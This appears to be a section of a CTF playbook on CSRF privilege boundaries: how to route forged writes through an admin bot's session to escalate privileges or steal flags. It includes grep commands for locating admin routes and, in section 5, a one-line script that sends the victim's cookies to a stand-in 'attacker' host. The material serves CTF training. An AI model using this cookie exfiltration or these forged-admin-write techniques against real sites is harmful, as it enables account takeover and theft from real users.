# Privilege boundary — writes that need the admin's session

The CSRF's power scales with the viewer's privilege. A write needing
admin only works through the admin-bot's session — map the required
privilege to the viewer you can deliver to.

---

## 1. The privilege tiers

```text
- a write ANY session can do (update own profile) → any victim
- a write needing a specific role (admin panel) → the admin viewer
- a write needing the account-owner (transfer own funds) → the owner
- a write needing a fixed bot account (the SSOS bot) → that account's
  session
```

The CSRF delivers through WHOEVER has the privilege — the write's
auth requirement is the targeting constraint.

## 2. The admin-write surface

```bash
# the admin/privileged writes — what the bot's session unlocks
grep -rnoiE 'admin|role|grant|approve|moderate|ban|flag|secret|internal|debug|stats' \
  <src> | grep -iE 'route|@|app\.|def |post|get' | head -30
```

| Admin write | The CSRF use |
|---|---|
| `POST /admin/grant` | privilege-escalation — grant the attacker |
| `POST /admin/set-flag` | the flag-write — set it readable |
| `POST /admin/config` | a config-write for the next layer |
| `GET /admin/stats` | the flag-read page — an Lax GET |
| `POST /admin/approve` | approve a pending request |

## 3. The "the bot is admin" read — the privilege you get

```bash
# is the bot's session privileged?
grep -rnoiE 'admin|is_admin|role.*admin|bot.*login|admin.*password|flag.*cookie|user.*admin' <src> | head -20
```

The bot usually holds an ADMIN session or the flag itself — the
CSRF rides that privilege.

## 4. The account-owner write — the self-write boundary

```text
a write that only works on the VICTIM's own object — 'transfer MY
funds', 'change MY email' — needs the victim's session. the CSRF
delivers through the victim; the write hits THEIR account, and the
result (the transfer target, the new email) is the attacker's.
```

The write's beneficiary is the attacker — the victim's authority
performs it.

## 5. The flag-in-context shape — the bot carries the flag

```text
some bots carry the flag IN their context:
- a cookie flag=<the-flag> on the bot's browser
- a localStorage the bot's page reads
- a page-content the bot's session can access
the CSRF doesn't need to MOVE the flag — it needs to reach the
bot's context and READ the flag via a same-origin channel, OR
write it to a place you read.
```

```js
// a stored-XSS-via-CSRF that reads the bot's flag-cookie and exfils
// (needs the cookie to be non-HttpOnly and JS-readable)
fetch('https://attacker/?f='+document.cookie)
```

## 6. The "the write needs MY object" — the IDOR-adjacent

```text
a write that takes an object-id — the CSRF writes to whatever id
you put in the form. if the endpoint doesn't check ownership (an
IDOR), the CSRF writes to a foreign object — but that needs the
endpoint to skip the ownership check (web-idor's class).
```

## 7. The privilege→delivery map

| The write needs | Deliver to |
|---|---|
| any session | any victim — a link, a stored page |
| admin | the admin-bot's session |
| the account-owner | the owner's session — a CSRF page they visit |
| a fixed bot account | the shared jar's swap (SSOS) |
| localhost | the bot's position (TornadoService) |

## 8. The "the write uses the victim's privilege for MY benefit"

```text
the CSRF's essence: the victim's authority performs an action that
benefits the attacker:
- the victim's admin writes the flag to your account
- the victim's owner-authority transfers to you
- the victim's session creates a record you read
```

## 9. The privilege-boundary falsifier

```text
- the write needs a privilege no viewer you can reach has → dead
- the write needs the victim's own-object AND the object is
  unreachable to you → dead
- the bot holds no session/privilege → no ambient authority to ride
```

## 10. The ledger

```bash
python3 tools/state.py <c> --hypothesis \
  "privilege-boundary: admin-write via the admin-bot's session"
```
